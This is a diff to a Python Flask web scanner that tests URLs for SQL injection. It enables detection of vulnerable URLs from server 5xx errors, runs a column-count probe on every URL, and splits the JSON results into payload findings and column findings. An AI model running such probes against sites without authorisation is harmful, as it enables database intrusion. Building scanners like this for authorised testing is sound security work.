@@ -135,9 +135,9 @@ def exploit_sqli(url):
         target_url = url + payload
         try:
             r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
-            #if 500 <= r.status_code < 600:
-                #vulnerable_urls.append((target_url, payload))
-                #print(f"[+] URL vulnerable detectada: {target_url} con el payload: {payload}")
+            if 500 <= r.status_code < 600:
+                vulnerable_urls.append((target_url, payload))
+                print(f"[+] URL vulnerable detectada: {target_url} con el payload: {payload}")
                 
         except SSLError:
             return False
@@ -191,25 +191,27 @@ def handle_scan():
         results = []
         for test_url in urls_to_test:
             sqli_result = exploit_sqli(test_url)
+            num_col = exploit_sqli_column_number(test_url)
             if sqli_result:
                 results.append({
                     "url": test_url,
                     "payloads": sqli_result
                 })
+                
+            if num_col:
+                print(Fore.GREEN + f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
+                results.append({
+                    "url": test_url,
+                    "columns_detected": num_col
+                })
             else:
-                num_col = exploit_sqli_column_number(test_url)
-                if num_col:
-                    print(Fore.GREEN + f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
-                    results.append({
-                        "url": test_url,
-                        "columns_detected": num_col
-                    })
-                else:
-                    print("[-] URL not vulnerable to SQL injection")
+                print("[-] URL not vulnerable to SQL injection")
             
         return jsonify({
-            "sql_vulnerabilities_found": len(results) > 0,
-            "sql_injection_results": results
+            "sql_vulnerabilities_found": any('payloads' in result for result in results),
+            "columns_detected_found": any('columns_detected' in result for result in results),
+            "sql_injection_results": [r for r in results if 'payloads' in r],
+            "column_detection_results": [r for r in results if 'columns_detected' in r]
         })
         
     else:
